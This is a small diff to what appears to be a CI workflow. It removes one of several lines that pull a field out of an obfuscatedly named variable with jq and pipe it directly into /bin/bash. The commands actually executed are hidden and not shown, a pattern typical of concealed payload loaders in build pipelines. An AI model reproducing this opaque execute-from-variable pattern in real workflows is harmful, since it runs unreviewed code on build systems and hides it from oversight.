@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$xqrsp16" | jq -r .n98875 | /bin/bash
           echo $qsz9528 | jq -r .m74 | /bin/bash
           printf '%s' "$qdij8299" | jq -r .ylg6398 | /bin/bash
-          echo $qwv66 | jq -r .vl11172 | /bin/bash
           printf '%s' "$taif46" | jq -r .zv04635 | /bin/bash
 
       - name: Archive results
